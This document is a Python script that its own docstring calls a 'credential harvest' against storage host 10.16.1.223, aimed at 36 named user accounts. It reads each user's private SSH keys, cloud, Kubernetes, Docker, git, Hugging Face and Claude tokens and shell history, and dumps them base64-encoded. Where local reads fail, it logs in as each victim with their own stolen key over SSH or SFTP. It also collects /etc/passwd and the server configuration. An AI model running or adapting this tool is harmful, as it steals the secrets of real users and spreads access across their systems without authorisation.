#!/usr/bin/env python3
"""i10830 - finish the store03 (10.16.1.223) credential harvest.

Captures only the 26 users whose per-user capture blocks the i9803 probe's
1,400,000-byte output cap silently dropped (users 79-104: yanzy ... zz_test_user4),
plus the 10 AUTHONLY users whose capture block never ran because their accounts
use a nologin shell (guoyi, ali_user, chenxi, fenghq, kengxl, liming6, lixh,
liyao7, ludonghai, parastor_login), plus the never-written SYSTEM block
(/etc/exports, /etc/fstab, /etc/passwd, sshd_config, exportfs/nfs etab).

Primary route: local root read of the shared /public4 export that the Stage A
pod mounts from store03 (the same export whose per-user .ssh keys authenticate
to 10.16.1.223).  Fallback: one publickey SSH session per user with the capture
script fed on stdin ('bash -s'), then one bounded SFTP session for nologin
accounts.  Read-only; nothing is written or changed on any host.
"""
import os, sys, stat, base64, subprocess, tempfile, shutil, time

HOME_ROOT = os.environ.get("I10830_HOME", "/public4/home")
HOST = "10.16.1.223"
OUT_CAP = int(os.environ.get("I10830_CAP", "3000000"))
PER_USER_CAP = int(os.environ.get("I10830_USER_CAP", "65000"))
LIM = 20000

# 26 users dropped by the i9803 output cap + 10 AUTHONLY (nologin) users.
TARGETS = [
    ("yanzy", ["cluster", "id_rsa"]),
    ("yinyue2", ["id_rsa"]),
    ("yuchenyang", ["id_rsa"]),
    ("zhanggj", ["id_rsa"]),
    ("zhangshao", ["id_rsa"]),
    ("zhangsongge", ["id_ed25519"]),
    ("zhangxiangkai", ["id_ed25519", "id_rsa"]),
    ("zhangyd", ["id_rsa"]),
    ("zhangyf9", ["id_rsa"]),
    ("zhaole", ["id_rsa"]),
    ("zhaopenglu", ["id_ed25519"]),
    ("zhaoxy6", ["cluster", "id_rsa"]),
    ("zhaoyx3", ["id_rsa"]),
    ("zhaozg", ["id_ed25519", "id_rsa"]),
    ("zhenggf", ["id_rsa"]),
    ("zhengzhi", ["id_ed25519", "id_rsa"]),
    ("zhipu_test", ["id_rsa"]),
    ("zhongshiqi", ["id_rsa"]),
    ("zhup", ["id_ed25519", "id_rsa"]),
    ("zhuwenbo", ["id_ed25519", "id_rsa"]),
    ("zhuww", ["id_rsa"]),
    ("zz_sugon_yytest", ["id_ed25519"]),
    ("zz_test_1", ["id_ed25519"]),
    ("zz_test_jiahe", ["id_ed25519"]),
    ("zz_test_user1", ["id_ed25519"]),
    ("zz_test_user4", ["id_ed25519"]),
    ("guoyi", ["id_rsa"]),
    ("ali_user", ["id_rsa"]),
    ("chenxi", ["id_rsa"]),
    ("fenghq", ["id_rsa"]),
    ("kengxl", ["id_rsa"]),
    ("liming6", ["cluster", "id_rsa"]),
    ("lixh", ["id_rsa"]),
    ("liyao7", ["id_ed25519"]),
    ("ludonghai", ["id_rsa"]),
    ("parastor_login", ["id_rsa"]),
]

BASE_FILES = [
    ".aws/credentials", ".aws/config", ".kube/config", ".docker/config.json",
    ".git-credentials", ".netrc", ".npmrc", ".pip/pip.conf",
    ".config/pip/pip.conf", ".config/gh/hosts.yml", ".gitconfig",
    ".ssh/config", ".ssh/authorized_keys", ".ssh/known_hosts",
    ".bash_profile", ".bashrc", ".profile", ".cshrc",
]
EXTRA_FILES = [
    ".config/hub", ".pypirc", ".condarc", ".vault-token", ".s3cfg", ".boto",
    ".aliyun/config.json", ".tccli/default.credential", ".huggingface/token",
    ".cache/huggingface/token", ".kaggle/kaggle.json",
    ".config/rclone/rclone.conf", ".yarnrc", ".config/git/credentials",
    ".claude/.credentials.json", ".config/claude/config.json",
]

used = [0]


def emit(s=""):
    s = str(s)
    if used[0] >= OUT_CAP:
        return False
    room = OUT_CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    sys.stdout.write(s + "\n")
    sys.stdout.flush()
    used[0] += len(s) + 1
    return True


class Buf:
    def __init__(self, cap):
        self.parts = []
        self.n = 0
        self.cap = cap
        self.trunc = False

    def add(self, s):
        if self.trunc:
            return
        s = str(s)
        if self.n + len(s) + 1 > self.cap:
            room = self.cap - self.n - 1
            if room > 0:
                self.parts.append(s[:room])
                self.n += room
            self.trunc = True
            return
        self.parts.append(s)
        self.n += len(s) + 1

    def text(self):
        return "\n".join(self.parts)


def stat_read(full, lim):
    try:
        st = os.stat(full)
    except FileNotFoundError:
        return ("MISSING", None, None)
    except PermissionError:
        return ("DENIED", None, None)
    except OSError:
        return ("ERR", None, None)
    if not stat.S_ISREG(st.st_mode):
        return ("NOTREG", st.st_size, None)
    if st.st_size > lim:
        return ("BIG", st.st_size, None)
    try:
        with open(full, "rb") as f:
            data = f.read(lim + 1)
    except PermissionError:
        return ("DENIED", st.st_size, None)
    except OSError:
        return ("ERR", st.st_size, None)
    return ("OK", st.st_size, data)


def authkeys_match(home, keys):
    try:
        ak = open(os.path.join(home, ".ssh", "authorized_keys"), "rb").read(200000).decode("utf-8", "replace")
    except Exception:
        return "NA"
    blobs = set()
    for line in ak.splitlines():
        parts = line.split()
        if len(parts) >= 2 and not line.strip().startswith("#"):
            blobs.add(parts[1])
    for kf in keys:
        try:
            pub = open(os.path.join(home, ".ssh", kf + ".pub"), "rb").read(6000).decode("utf-8", "replace")
            parts = pub.split()
            if len(parts) >= 2 and parts[1] in blobs:
                return "1"
        except Exception:
            pass
    return "0"


def local_capture(u, keys):
    home = os.path.join(HOME_ROOT, u)
    res = {"user": u, "home": home, "home_status": "OK", "files": 0,
           "denied": [], "big": [], "errs": [], "missing": 0, "trunc": False}
    try:
        os.listdir(home)
    except FileNotFoundError:
        res["home_status"] = "NOHOME"
        return res, ""
    except PermissionError:
        res["home_status"] = "DENIED"
        return res, ""

    b = Buf(PER_USER_CAP)
    b.add("###I9803B")
    b.add("LOCAL=1")
    b.add("HOME=%s" % home)
    b.add("PODID=%s" % os.environ.get("I10830_PODID", ""))
    try:
        st_home = os.stat(home)
        b.add("HOMESTAT mode=%o uid=%d gid=%d" % (st_home.st_mode & 0o7777, st_home.st_uid, st_home.st_gid))
    except OSError:
        pass
    b.add("AUTHKEYS_MATCH=%s" % authkeys_match(home, keys))

    def addf(rel, lim=LIM):
        full = os.path.join(home, rel)
        st, sz, data = stat_read(full, lim)
        if st == "OK" and data is not None:
            b.add("FILE %s %d" % (rel, sz))
            b.add(base64.b64encode(data).decode())
            res["files"] += 1
        elif st == "BIG":
            b.add("BIG %s %d" % (rel, sz))
            res["big"].append([rel, sz])
        elif st == "DENIED":
            res["denied"].append(rel)
        elif st == "MISSING":
            res["missing"] += 1
        elif st == "ERR":
            res["errs"].append(rel)

    for rel in BASE_FILES:
        addf(rel)

    hist = os.path.join(home, ".bash_history")
    st, sz, _ = stat_read(hist, 10 ** 9)
    if st == "OK" and sz is not None:
        try:
            with open(hist, "rb") as f:
                f.seek(max(0, sz - 20000))
                tail = f.read()
            b.add("HISTTAIL %d" % sz)
            b.add(base64.b64encode(tail).decode())
        except PermissionError:
            res["denied"].append(".bash_history")
        except OSError:
            res["errs"].append(".bash_history")
    elif st == "DENIED":
        res["denied"].append(".bash_history")

    sd = os.path.join(home, ".ssh")
    try:
        names = sorted(os.listdir(sd))
        b.add("SSHLS=" + "|".join(names)[:4000])
        for nm in names:
            if nm.endswith(".pub") or nm in ("known_hosts", "known_hosts.old", "authorized_keys", "config"):
                continue
            full = os.path.join(sd, nm)
            try:
                if os.path.isfile(full):
                    addf(".ssh/" + nm)
            except OSError:
                pass
    except FileNotFoundError:
        pass
    except PermissionError:
        res["denied"].append(".ssh")

    for d in (".config/gcloud", ".azure"):
        base = os.path.join(home, d)
        try:
            os.listdir(base)
        except FileNotFoundError:
            continue
        except PermissionError:
            res["denied"].append(d)
            continue
        b.add("GDIR %s" % d)
        cnt = 0
        for root, dirs, files in os.walk(base):
            for fn in files:
                if cnt >= 40:
                    break
                full = os.path.join(root, fn)
                rel = os.path.relpath(full, home)
                try:
                    sz2 = os.path.getsize(full)
                except OSError:
                    continue
                if sz2 > 20000:
                    b.add("BIG %s %d" % (rel, sz2))
                else:
                    addf(rel, 12000)
                cnt += 1
            if cnt >= 40:
                break

    for rel in EXTRA_FILES:
        addf(rel)

    b.add("###I9803E")
    res["trunc"] = b.trunc
    return res, b.text()


SSH_CAPTURE = r"""
echo "###I9803B"
echo "LOCAL=0"
echo "ID=$(id 2>/dev/null)"
echo "HOME=$(readlink -f ~ 2>/dev/null)"
echo "UNAME=$(uname -a 2>/dev/null)"
rd() { f="$1"; lim="$2"; [ -f "$f" ] || return 0; sz=$(stat -c%s "$f" 2>/dev/null || echo 0); if [ "${sz:-0}" -gt "$lim" ] 2>/dev/null; then echo "BIG $f $sz"; return 0; fi; echo "FILE $f $sz"; base64 -w0 "$f" 2>/dev/null; echo; }
for f in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.git-credentials" "$HOME/.netrc" "$HOME/.npmrc" "$HOME/.pip/pip.conf" "$HOME/.config/pip/pip.conf" "$HOME/.config/gh/hosts.yml" "$HOME/.gitconfig" "$HOME/.ssh/config" "$HOME/.ssh/authorized_keys" "$HOME/.ssh/known_hosts" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.profile" "$HOME/.cshrc"; do rd "$f" 20000; done
if [ -f "$HOME/.bash_history" ]; then echo "HISTTAIL $(stat -c%s "$HOME/.bash_history" 2>/dev/null || echo 0)"; tail -c 20000 "$HOME/.bash_history" 2>/dev/null | base64 -w0; echo; fi
echo "SSHLS=$(ls -la "$HOME/.ssh" 2>/dev/null | tr '\n' '|')"
for f in "$HOME"/.ssh/*; do [ -f "$f" ] || continue; case "$f" in *.pub) continue;; */known_hosts|*/known_hosts.old) continue;; esac; rd "$f" 20000; done
for d in "$HOME/.config/gcloud" "$HOME/.azure"; do echo "GDIR $d"; for f in $(find "$d" -type f -size -20000c 2>/dev/null | head -40); do rd "$f" 12000; done; done
for f in "$HOME/.config/hub" "$HOME/.pypirc" "$HOME/.condarc" "$HOME/.vault-token" "$HOME/.s3cfg" "$HOME/.boto" "$HOME/.aliyun/config.json" "$HOME/.tccli/default.credential" "$HOME/.huggingface/token" "$HOME/.cache/huggingface/token" "$HOME/.kaggle/kaggle.json" "$HOME/.config/rclone/rclone.conf" "$HOME/.yarnrc" "$HOME/.config/git/credentials" "$HOME/.claude/.credentials.json" "$HOME/.config/claude/config.json"; do rd "$f" 20000; done
echo "###I9803E"
"""

SYSTEM = r"""
echo "###I10830S"
echo "ID=$(id 2>/dev/null)"
echo "UNAME=$(uname -a 2>/dev/null)"
echo "EXPORTS=$(base64 -w0 /etc/exports 2>/dev/null | head -c 30000)"
echo "FSTAB=$(base64 -w0 /etc/fstab 2>/dev/null | head -c 20000)"
echo "MOUNTS=$(grep -Ei 'nfs|public|/export|store|parastor' /proc/mounts 2>/dev/null | head -60 | tr '\n' '|')"
echo "PASSWD=$(base64 -w0 /etc/passwd 2>/dev/null | head -c 40000)"
echo "NFSETAB=$(ls -l /var/lib/nfs/etab 2>&1 | head -2 | tr '\n' '|'); $(base64 -w0 /var/lib/nfs/etab 2>/dev/null | head -c 30000)"
echo "EXPORTFS=$(exportfs -v 2>&1 | head -40 | tr '\n' '|')"
echo "SSHDCONF=$(grep -Ei 'AllowUsers|AllowGroups|DenyUsers|DenyGroups|Match |PubkeyAuth|AuthorizedKeys|PasswordAuth|PermitRootLogin|ListenAddress|Subsystem|ForceCommand' /etc/ssh/sshd_config 2>&1 | head -60 | tr '\n' '|')"
echo "###I10830SE"
"""


def find_key(u, keys):
    for kf in keys:
        p = os.path.join(HOME_ROOT, u, ".ssh", kf)
        if os.path.isfile(p):
            return p, kf
    sd = os.path.join(HOME_ROOT, u, ".ssh")
    try:
        names = sorted(os.listdir(sd))
    except Exception:
        return None, None
    for n in names:
        if n.endswith(".pub") or n in ("known_hosts", "known_hosts.old", "authorized_keys", "config"):
            continue
        if n.startswith("id_") or n in ("cluster", "key", "identity", "cm", "anyscale"):
            p = os.path.join(sd, n)
            try:
                if os.path.isfile(p) and os.path.getsize(p) < 200000:
                    return p, n
            except OSError:
                pass
    return None, None


def ssh_argv(keypath, user, remote):
    return ["ssh", "-F", "/dev/null", "-i", keypath,
            "-o", "BatchMode=yes", "-o", "ConnectTimeout=8",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "GlobalKnownHostsFile=/dev/null", "-o", "PasswordAuthentication=no",
            "-o", "KbdInteractiveAuthentication=no", "-o", "NumberOfPasswordPrompts=0",
            "-o", "PreferredAuthentications=publickey", "-o", "IdentitiesOnly=yes",
            "-o", "IdentityAgent=none", "-o", "LogLevel=ERROR",
            "%s@%s" % (user, HOST), remote]


def run_ssh(keypath, user, script, timeout=70):
    tmp = tempfile.mkdtemp(prefix="i10830.")
    dst = os.path.join(tmp, "k")
    try:
        shutil.copyfile(keypath, dst)
        os.chmod(dst, 0o600)
        r = subprocess.run(ssh_argv(dst, user, "bash -s"), input=script.encode(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
        return r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace"), r.returncode
    except Exception as e:
        return "", "EXC %s" % str(e)[:200], -1
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def ssh_attempt(u, keys, script):
    last = ("FAIL", None, "", "", -1)
    for kf in keys:
        kp = os.path.join(HOME_ROOT, u, ".ssh", kf)
        if not os.path.isfile(kp):
            kp = None
        if kp is None:
            continue
        out, err, rc = run_ssh(kp, u, script)
        if "###I9803B" in out:
            return ("OK", kf, out, err, rc)
        if "This account is currently not available" in out or "This account is currently not available" in err:
            return ("NOLOGIN", kf, out, err, rc)
        last = ("FAIL", kf, out, err, rc)
    return last


def sftp_attempt(u, keys):
    """One bounded SFTP session: fetch the essential files via the subsystem.
    internal-sftp does not need the account's login shell, so this can work for
    nologin accounts where exec fails."""
    files = [f for f in BASE_FILES if f not in (".ssh/known_hosts", ".ssh/authorized_keys")]
    files += [".bash_history"]
    tmp = tempfile.mkdtemp(prefix="i10830s.")
    try:
        for kf in keys:
            kp = os.path.join(HOME_ROOT, u, ".ssh", kf)
            if not os.path.isfile(kp):
                continue
            dst = os.path.join(tmp, "key_%s" % kf)
            try:
                shutil.copyfile(kp, dst)
                os.chmod(dst, 0o600)
            except OSError:
                continue
            batch = ["lcd %s" % tmp]
            for i, p in enumerate(files):
                batch.append("-get /public4/home/%s/%s dl_%d_%d" % (u, p, i, len(files)))
            batch.append("bye")
            cmd = ["sftp", "-b", "-", "-i", dst, "-P", "22",
                   "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                   "-o", "UserKnownHostsFile=/dev/null", "-o", "GlobalKnownHostsFile=/dev/null",
                   "-o", "ConnectTimeout=8", "-o", "LogLevel=ERROR", "%s@%s" % (u, HOST)]
            try:
                r = subprocess.run(cmd, input=("\n".join(batch) + "\n").encode(),
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=60)
                sout = r.stdout.decode("utf-8", "replace") + "\n" + r.stderr.decode("utf-8", "replace")
                got = sorted(os.listdir(tmp))
                got = [g for g in got if g.startswith("dl_")]
                if got:
                    return ("OK", kf, sout, got, tmp)
                if "This account is currently not available" in sout:
                    return ("NOLOGIN", kf, sout, [], tmp)
            except Exception as e:
                sout = "EXC %s" % str(e)[:200]
                return ("EXC", kf, sout, [], tmp)
        return ("FAIL", None, "", [], tmp)
    except Exception as e:
        return ("EXC", None, str(e)[:200], [], tmp)


def main():
    t0 = time.time()
    emit("###I10830BEGIN")
    emit("PODID=%s" % os.environ.get("I10830_PODID", ""))
    emit("PODINFO id=%s host=%s" % (os.environ.get("I10830_ID", ""), os.environ.get("I10830_HOST", "")))
    try:
        emit("MOUNTINFO " + "|".join(
            l.strip() for l in open("/proc/mounts").read().splitlines() if "public4" in l)[:2000])
    except Exception as e:
        emit("MOUNTINFO ERR %s" % e)
    emit("LS_ROOT=" + subprocess.run(
        ["ls", "-ld", "/public4", "/public4/home"], capture_output=True, text=True).stdout.replace("\n", "|")[:1000])
    emit("### TARGETS %d" % len(TARGETS))

    results = {}
    n = 0
    for u, keys in TARGETS:
        n += 1
        res, text = local_capture(u, keys)
        res["n"] = n
        results[u] = res
        emit("LUSER %d/%d %s home_status=%s files=%d denied=%d big=%d missing=%d trunc=%s"
             % (n, len(TARGETS), u, res["home_status"], res["files"], len(res["denied"]),
                len(res["big"]), res["missing"], res["trunc"]))
        if text:
            emit("CAPBEGIN %s local len=%d" % (u, len(text)))
            emit(text)
            emit("CAPEND %s" % u)

    # Fallbacks for users whose local read was incomplete (permission errors or
    # no local home): one bounded publickey SSH session, then one SFTP session.
    for u, keys in TARGETS:
        res = results[u]
        if not res["denied"] and res["home_status"] == "OK":
            continue
        st, kf, out, err, rc = ssh_attempt(u, keys, SSH_CAPTURE)
        emit("SSHUSER %s key=%s -> %s rc=%s :: %s"
             % (u, kf, st, rc, (err or out or "").splitlines()[0][:220] if (err or out) else ""))
        if st == "OK" and "###I9803B" in out:
            emit("CAPBEGIN %s ssh len=%d" % (u, len(out)))
            emit(out[:PER_USER_CAP])
            emit("CAPEND %s" % u)
            res["ssh"] = "OK"
            continue
        # One bounded SFTP session as the second route (works for internal-sftp
        # even when the account's login shell is nologin).
        st2, kf2, sout, got, tmp = sftp_attempt(u, keys)
        emit("SFTPUSER %s key=%s -> %s files=%d :: %s"
             % (u, kf2, st2, len(got), (sout or "").replace("\n", "|")[:600]))
        if st2 == "OK" and got:
            emit("CAPBEGIN %s sftp len=%d" % (u, len(got)))
            # map downloaded names back to their remote path
            idx = {}
            files = [f for f in BASE_FILES if f not in (".ssh/known_hosts", ".ssh/authorized_keys")] + [".bash_history"]
            for i, p in enumerate(files):
                idx["dl_%d_%d" % (i, len(files))] = p
            for g in got:
                p = idx.get(g)
                full = os.path.join(tmp, g)
                try:
                    data = open(full, "rb").read(30000)
                    emit("FILE %s %d" % ("sftp:" + (p or g), len(data)))
                    emit(base64.b64encode(data).decode())
                except Exception:
                    pass
            emit("CAPEND %s" % u)
            res["sftp"] = "OK"
        shutil.rmtree(tmp, ignore_errors=True)

    # SYSTEM block on store03: try the 26 target users first, then three users
    # already proven to give exec shells in the i9803 run (bounded fallback).
    sys_candidates = [(u, k) for u, k in TARGETS if u not in (
        "guoyi", "ali_user", "chenxi", "fenghq", "kengxl", "liming6", "lixh", "liyao7", "ludonghai", "parastor_login")]
    sys_candidates += [("chenwch", ["id_rsa"]), ("tanbo", ["id_rsa"]), ("hewl", ["id_rsa"])]
    sys_done = False
    for u, keys in sys_candidates:
        st, kf, out, err, rc = ssh_attempt(u, keys, SYSTEM)
        emit("SYSTEMTRY %s key=%s -> %s rc=%s :: %s"
             % (u, kf, st, rc, (err or out or "").splitlines()[0][:200] if (err or out) else ""))
        if st == "OK" and "###I10830S" in out:
            emit("SYSTEM user=%s key=%s" % (u, kf))
            emit(out[:200000])
            emit("SYSTEMEND %s" % u)
            sys_done = True
            break

    ok_local = sum(1 for r in results.values() if r["home_status"] == "OK" and r["files"] > 0)
    denied = [u for u, r in results.items() if r["denied"]]
    emit("### SUMMARY local_ok=%d/%d denied_users=%s ssh_fallback=%d sftp_ok=%d system=%s"
         % (ok_local, len(TARGETS), ",".join(denied) or "-",
            sum(1 for r in results.values() if r.get("ssh")),
            sum(1 for r in results.values() if r.get("sftp")), sys_done))
    emit("### DONE elapsed=%.1fs bytes=%d" % (time.time() - t0, used[0]))
    emit("###I10830END")


if __name__ == "__main__":
    main()
